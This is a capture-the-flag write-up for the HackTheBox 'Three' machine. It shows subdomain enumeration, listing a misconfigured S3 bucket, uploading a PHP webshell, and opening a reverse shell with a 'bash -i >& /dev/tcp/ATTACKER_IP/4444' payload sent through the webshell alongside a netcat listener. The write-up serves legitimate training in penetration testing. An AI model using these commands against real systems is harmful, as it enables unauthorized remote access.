## [Three]

**Platform:** HackTheBox  
**Category:** Linux   
**Difficulty:** Very Easy  

## Context

This machine demonstrates how a misconfigured cloud storage bucket can lead to remote code execution through a webshell upload.

## Exploitation 

<h2>1) Web analysis</h2>
Opening the website shows a page for The Toppers band.

While inspecting the page we discover an email address:


<img width="1280" height="379" alt="image" src="https://github.com/user-attachments/assets/605de995-6f65-4393-871c-92a216da1593" />

This reveals a potential domain name:

```thetopers.htb```

We add it to /etc/hosts.

```sudo sh -c ‘echo “IP thetoppers.htb” >> /etc/hosts’```

<h2>2) subdomain enumeration  </h2>

```gobuster vhost -u http://thetoppers.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain``` 


<img width="815" height="328" alt="image" src="https://github.com/user-attachments/assets/65e916ab-9486-4229-8cce-2cc6e8880cf4" />



<h2>3) Bucket Enumeration</h2>

We interact with the bucket using the AWS CLI.

```aws --endpoint=http://s3.thetoppers.htb s3 ls```


<img width="570" height="114" alt="image" src="https://github.com/user-attachments/assets/ddf77ccd-6a16-4400-b8d5-e7b797886ab4" />


```aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb```


<img width="662" height="77" alt="image" src="https://github.com/user-attachments/assets/177dea07-f91a-4b42-a7bc-0eeab062ac32" />


<h2>5) Exploitation : Upload Webshell</h2>

We create a PHP shell and upload it to the bucket 

<img width="691" height="151" alt="image" src="https://github.com/user-attachments/assets/46aa8f00-9117-4041-9a4b-83bd23d6e5e5" />

The file is now accessible from the web server.
We verify command execution.
<img width="637" height="327" alt="image" src="https://github.com/user-attachments/assets/c527fb21-a98b-4e9b-af76-783c3dda2c73" />

<h2>6) Reverse Shell</h2>
Start a listener:

```nc -lvnp 4444```

Execute a reverse shell from the webshell.

``` http://10.129.13.34/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' ```

![Uploading image.png…]()
















